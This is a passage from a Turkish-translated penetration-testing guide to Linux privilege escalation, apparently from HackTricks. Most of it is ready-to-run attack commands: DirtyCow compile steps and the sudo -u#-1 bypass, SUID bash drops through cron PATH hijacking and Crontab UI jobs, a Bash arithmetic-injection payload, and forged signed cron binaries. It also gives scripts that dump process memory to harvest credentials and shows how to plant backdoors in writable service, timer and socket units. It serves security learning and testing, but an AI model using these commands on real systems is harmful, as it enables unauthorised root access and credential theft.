# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkeni içindeki herhangi bir klasörde yazma izniniz varsa** bazı kütüphaneleri veya ikili dosyaları hijack edebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgileri

Ortamdaki değişkenlerde ilginç bilgiler, şifreler veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve escalate privileges için kullanılabilecek bir exploit olup olmadığını kontrol edin
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir vulnerable kernel listesi ve bazı zaten **compiled exploits** şu adreste bulunabilir: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O siteden tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits aramaya yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (hedef üzerinde çalıştırın; sadece kernel 2.x için exploit'leri kontrol eder)

Her zaman **search the kernel version in Google**, çünkü kernel version'ınız bazı kernel exploit'lerinde yazılı olabilir; böylece bu exploit'in geçerli olduğundan emin olabilirsiniz.

Ek kernel exploitation teknikleri:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda görünen zafiyetli sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün zafiyetli olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 öncesi Sudo sürümleri (**1.9.14 - 1.9.17 < 1.9.17p1**) kullanıcı kontrollü bir dizinden `/etc/nsswitch.conf` dosyası kullanıldığında, yetkisiz yerel kullanıcıların sudo `--chroot` seçeneği aracılığıyla ayrıcalıklarını root'a yükseltmelerine izin verir.

Bu [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), bahsedilen [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)'i exploit etmek içindir. Exploit'i çalıştırmadan önce, `sudo` sürümünüzün etkilenip etkilenmediğini ve `chroot` özelliğini destekleyip desteklemediğini doğrulayın.

Daha fazla bilgi için orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)'e bakın.

#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Bu vuln'ün nasıl istismar edilebileceğine dair bir **örnek** için **smasher2 box of HTB**'ye bakın
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları sıralayın

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:

{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

Hangi şeylerin **mount edildiğini ve unmount edildiğini**, nerede ve neden olduğunu kontrol edin. Eğer bir şey unmount edilmişse, onu mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılım

Kullanışlı binaries'leri listele
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **any compiler is installed** olup olmadığını kontrol edin. Bu, bazı kernel exploit'lerini kullanmanız gerekiyorsa faydalıdır; çünkü bunları kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kurulu Zafiyetli Yazılımlar

Kurulu paketlerin ve servislerin **sürümünü** kontrol edin. Örneğin, eski bir Nagios sürümü olabilir; bu sürüm escalating privileges için exploit edilebilir…\
Daha şüpheli kurulu yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Bu komutların çoğunlukla gereksiz olacak çok fazla bilgi göstereceğini unutmayın; bu nedenle yüklü herhangi bir yazılım sürümünün bilinen exploits'e karşı savunmasız olup olmadığını kontrol eden OpenVAS veya benzeri uygulamalar önerilir._

## İşlemler

Çalıştırılan **hangi işlemler** olduğuna bakın ve herhangi bir işlemin **hak etmesi gerekenden daha fazla ayrıcalığa** sahip olup olmadığını kontrol edin (örneğin tomcat'in root tarafından çalıştırılıyor olması?)
```bash
ps aux
ps -ef
top -n 1
```
Her zaman [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin. **Linpeas** process'in komut satırında `--inspect` parametresini kontrol ederek bunları tespit eder.\
Ayrıca **check your privileges over the processes binaries**, belki birini overwrite edebilirsiniz.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Sunucudaki bazı servisler belleğin içinde **credentials in clear text inside the memory** kaydedebilir.\
Normalde başka kullanıcılara ait process'lerin belleğini okumak için **root privileges** gerekir; bu yüzden bu genellikle zaten root olduğunuzda ve daha fazla credentials keşfetmek istediğinizde daha yararlıdır.\
Ancak unutmayın ki **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: aynı uid'ye sahip oldukları sürece tüm süreçler debug edilebilir. Bu ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: yalnızca parent process debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir, çünkü CAP_SYS_PTRACE yetkisi gereklidir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında ptracing'i tekrar etkinleştirmek için reboot gerekir.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir process ID için, **maps o işlemin sanal adres alanı içinde belleğin nasıl haritalandığını gösterir**; ayrıca **her haritalanmış bölgenin izinlerini** gösterir. Sahte (pseudo) dosya olan **mem**, **işlemin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların ofsetlerini biliriz. Bu bilgiyi kullanarak **mem dosyasında seek yapıp tüm okunabilir bölgeleri bir dosyaya dump ederiz**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` sadece **root** ve **kmem** grubu tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç paketinin klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. Edinin: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir process memory'yi dump etmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Kök gereksinimlerini manuel olarak kaldırabilir ve size ait olan process'i dump edebilirsiniz
- Script A.5 için: [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gerekli)

### Process Memory'den Credentials

#### Manuel örnek

Authenticator process'in çalıştığını görürseniz:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
process'i dump edebilirsiniz (önceki bölümlere bakın; bir process'in memory'sini dump etmenin farklı yollarını bulmak için) ve memory içinde credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Bu araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) bellekteki **düz metin kimlik bilgilerini** ve bazı **bilinen dosyalardaki** bilgileri çalacaktır. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | İşlem Adı             |
| ------------------------------------------------- | --------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password          |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon  |
| LightDM (Ubuntu Desktop)                          | lightdm               |
| VSFTPd (Active FTP Connections)                   | vsftpd                |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2               |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                 |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron görevleri

### Crontab UI (alseambusher) running as root – web tabanlı zamanlayıcı privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyorsa ve yalnızca loopback'e bağlıysa, yine de SSH local port-forwarding ile ona erişebilir ve yükseltmek için ayrıcalıklı bir job oluşturabilirsiniz.

Tipik zincir
- Sadece loopback'e bağlı portu keşfet (ör. 127.0.0.1:8000) ve Basic-Auth realm'ini `ss -ntlp` / `curl -v localhost:8000` ile tespit et
- Kimlik bilgilerini operasyonel artefaktlarda bul:
- Yedekler/scriptler `zip -P <password>`
- systemd unit'ünde `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` açığa çıkabilir
- Tünelle ve giriş yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluştur ve hemen çalıştır (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Güçlendirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve en az izinle kısıtlayın
- localhost'a bağlayın ve ek olarak firewall/VPN ile erişimi kısıtlayın; parolaları yeniden kullanmayın
- unit dosyalarına secrets gömmekten kaçının; secret stores veya sadece root için EnvironmentFile kullanın
- on-demand job executions için audit/logging etkinleştirin



Herhangi bir scheduled job'ın vulnerable olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizine belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'i şu şekilde bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Dikkat edin ki "user" kullanıcısının /home/user üzerinde yazma yetkisi olduğuna_)

Eğer bu crontab içinde root kullanıcısı path'i ayarlamadan bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Ardından, şu şekilde root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Eğer root tarafından çalıştırılan bir script'in bir komutun içinde “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için istismar edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard bir yolun öncesinde yer alıyorsa, örneğin** _**/some/path/\***_ **, zafiyete uğramaz (hatta** _**./\***_ **de değildir).**

Daha fazla wildcard exploitation tricks için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, parameter expansion ve command substitution işlemlerini ((...)), $((...)) ve let içindeki arithmetic evaluation'dan önce gerçekleştirir. Eğer bir root cron/parser güvensiz log alanlarını okuyup bunları bir arithmetic bağlamına aktarırsa, bir attacker command substitution olan $(...)'ı enjekte edebilir; cron çalıştığında bu root olarak çalışır.

- Neden işe yarar: Bash'te genişletmeler şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, sonra word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalıştırılır), kalan sayısal `0` ise arithmetic için kullanılır ve script hatasız devam eder.

- Tipik zayıf örnek:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed log'a attacker-controlled metin yazdırın, böylece sayısal görünen alan bir command substitution içerir ve bir rakam ile biter. Komutunuzun stdout'a yazmadığından emin olun (veya çıktıyı yönlendirin) ki arithmetic geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan bir **cron scriptini değiştirebilirseniz**, çok kolay bir şekilde shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script **tam erişiminiz olan bir dizini** kullanıyorsa, o klasörü silip, **başka bir klasöre symlink oluşturmak** ve böylece sizin kontrolünüzdeki bir scripti sunmak işe yarayabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue ekipleri bazen cron tarafından tetiklenen ikili dosyaları root olarak çalıştırmadan önce özel bir ELF bölümünü döküp vendor string'i grep ederek "sign" ederler. Eğer o ikili dosya group-writable ise (örn., `/opt/AV/periodic-checks/monitor` sahibi `root:devs 770`) ve signing material'ı leak edebiliyorsanız, bölümü sahteleyip cron görevini ele geçirebilirsiniz:

1. Doğrulama akışını yakalamak için `pspy` kullanın. Era'da root, `objcopy --dump-section .text_sig=text_sig_section.bin monitor` çalıştırdıktan sonra `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` ile kontrol edip ardından dosyayı çalıştırıyordu.
2. Leak olmuş key/config'ten (ör. `signing.zip`) beklenen sertifikayı yeniden oluşturun:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Zararlı bir ikame oluşturun (örn., SUID bash bırakmak, SSH anahtarınızı eklemek) ve grep'in geçmesi için sertifikayı `.text_sig` içine gömün:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Çalıştırma bitlerini koruyarak zamanlanmış ikiliyi üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekleyin; basit imza kontrolü başarılı olunca payload'ınız root olarak çalışır.

### Frequent cron jobs

Süreçleri, her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri aramak için izleyebilirsiniz. Belki bundan faydalanıp ayrıcalıkları yükseltebilirsiniz.

Örneğin, 1 dakika boyunca her 0.1s'de izlemek, en az çalıştırılan komutlara göre sıralamak ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izleyecek ve listeleyecektir).

### Görünmez cron jobs

Bir yorumdan sonra **carriage return koyarak** (yeni satır karakteri olmadan) bir cronjob oluşturmak mümkündür ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin; yazabiliyorsanız onu **değiştirebilirsiniz** böylece servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** sizin **backdoor**'unuz **çalıştırılır** (belki makinenin yeniden başlatılmasını beklemeniz gerekir).  
Örneğin `.service` dosyasının içine backdoor'unuzu **`ExecStart=/tmp/script.sh`** ile oluşturun.

### Yazılabilir servis ikili dosyaları

Unutmayın, eğer **servisler tarafından çalıştırılan ikili dosyalar üzerinde yazma iznine sahip olduğunuzu** fark ederseniz, bunları backdoor'lar için değiştirebilir ve servisler yeniden çalıştırıldığında backdoor'lar çalıştırılır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **write** yazma izniniz olduğunu fark ederseniz, muhtemelen **escalate privileges** yapabilirsiniz. Aşağıdaki gibi servis yapılandırma dosyalarında kullanılan göreli yolları (relative paths) aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörü içine, görece yol binary'si ile aynı ada sahip bir **executable** oluşturun; servis ilgili savunmasız eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, sizin **backdoor**'unuz çalıştırılacaktır (ayrıcalıksız kullanıcılar genellikle servisleri başlatıp durduramazlar ama `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Servisler hakkında daha fazlasını `man systemd.service` ile öğrenin.**

## **Timers**

**Timers**, adı `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden systemd unit dosyalarıdır. **Timers**, takvim zaman olayları ve monotonik zaman olayları için yerleşik destek sağladıkları ve eşzamanlı olmayan şekilde çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm **Timers** birimlerini şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Eğer bir zamanlayıcıyı değiştirebiliyorsanız, systemd.unit içindeki bazı mevcut birimleri (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şöyle yazıyor:

> Bu timer sona erdiğinde aktive edilecek unit. Argüman, son eki not ".timer" olan bir unit adıdır. Belirtilmemişse, bu değer varsayılan olarak timer unit ile aynı ada sahip bir service olur; tek fark son ektir. (Yukarıya bakın.) Aktive edilen unit adı ile timer unit adı, ek hariç aynı olacak şekilde adlandırılması tavsiye edilir.

Bu nedenle, bu izni kötüye kullanmak için şunlara ihtiyacınız olur:

- Yazılabilir bir binary çalıştıran bir systemd unit (ör. `.service`) bulun
- **göreli bir yolu çalıştıran** ve **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip bir systemd unit bulun (o executable'ı taklit etmek için)

**Zamanlayıcılar hakkında daha fazlasını `man systemd.timer` ile öğrenin.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Soketler

Unix Domain Sockets (UDS) istemci-sunucu modellerinde aynı veya farklı makineler arasında **süreç iletişimine** olanak tanır. Standart Unix dosya tanımlayıcılarını kullanırlar ve `.socket` dosyaları aracılığıyla yapılandırılırlar.

Sockets, `.socket` dosyaları kullanılarak yapılandırılabilir.

**Sockets hakkında daha fazla bilgi için `man systemd.socket`'a bakın.** Bu dosya içinde yapılandırılabilecek birkaç ilginç parametre vardır:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır, ancak özetle soketin nerede dinleyeceğini **belirtmek** için kullanılır (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 adresi ve/veya port numarası vb.).
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, her gelen bağlantı için bir **service instance** oluşturulur ve yalnızca bağlantı soketi ona iletilir. Eğer **false** ise, tüm dinleyen soketler **başlatılan service birimine geçirilir** ve tüm bağlantılar için yalnızca bir service birimi oluşturulur. Bu değer, tek bir service biriminin tüm gelen trafiği koşulsuz olarak işlediği datagram soketleri ve FIFO'lar için göz ardı edilir. **Varsayılan false**'tur. Performans nedenleriyle yeni daemon'ların yalnızca `Accept=no` için uygun şekilde yazılması tavsiye edilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar sırasıyla dinleyen **sockets**/FIFO'lar **oluşturulup** bağlanmadan **önce** veya **sonra** **çalıştırılır**. Komut satırının ilk öğesi mutlak bir dosya adı olmalı, ardından süreç için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleyen **sockets**/FIFO'lar **kapatılmadan** ve kaldırılmadan **önce** veya **sonra** çalıştırılan ek **komutlar**.
- `Service`: Gelen trafik üzerinde **etkinleştirilecek** service birimi adını belirtir. Bu ayar yalnızca `Accept=no` olan socket'ler için izin verilir. Varsayılan olarak soketle aynı ada sahip (suffix değiştirilmiş) service'ı kullanır. Çoğu durumda bu seçeneği kullanmak gerekli olmamalıdır.

### Yazılabilir .socket dosyaları

Eğer **yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına şu gibi bir satır **ekleyebilirsiniz**: `ExecStartPre=/home/kali/sys/backdoor` ve backdoor soket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Yazılabilir soketler

Eğer herhangi bir **yazılabilir socket** tespit ederseniz (_şimdi bahsettiğimiz Unix Sockets ve config `.socket` dosyaları değil_), o soket ile **iletişim kurabilir** ve belki bir güvenlik açığından faydalanabilirsiniz.

### Unix Soketlerini Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Şunu unutmayın: bazı **sockets listening for HTTP** istekleri olabilir (_.socket dosyalarından değil, unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer socket **HTTP ile yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki de **exploit some vulnerability**.

### Yazılabilir Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

